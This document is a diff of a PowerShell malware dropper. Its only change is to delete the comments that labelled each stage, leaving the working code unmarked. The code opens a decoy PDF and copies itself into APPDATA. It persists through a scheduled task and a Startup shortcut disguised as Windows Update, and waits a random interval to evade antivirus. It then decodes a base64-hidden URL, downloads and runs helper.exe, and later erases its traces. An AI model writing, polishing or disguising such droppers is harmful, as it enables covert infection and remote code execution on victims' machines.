@@ -1,6 +1,5 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === QUICK DECOY PDF OPEN (IMMEDIATE) ===
 $cache = "$env:APPDATA\Microsoft\Windows\Caches"
 if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
 
@@ -22,7 +21,6 @@ if ($isFirstRun) {
     }
 }
 
-# === SELF-PRESERVATION: Ensure script is saved to disk ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
@@ -42,7 +40,6 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Scheduled Task ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -57,7 +54,6 @@ if (-not $taskExists) {
     } catch {}
 }
 
-# === PERSISTENCE: Startup LNK ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -69,10 +65,8 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-# === BEARFOOS EVASION: Long delay before EXE ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === DOWNLOAD AND EXECUTE PAYLOAD ===
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
 $exePath = "$cache\helper.exe"
 
@@ -91,5 +85,4 @@ if (Test-Path $exePath) {
     }
 }
 
-# === CLEANUP ===
 Start-Job -ScriptBlock { param($exe, $pdf) Start-Sleep -Seconds 300; Remove-Item $exe,$pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $exePath, $pdfPath | Out-Null
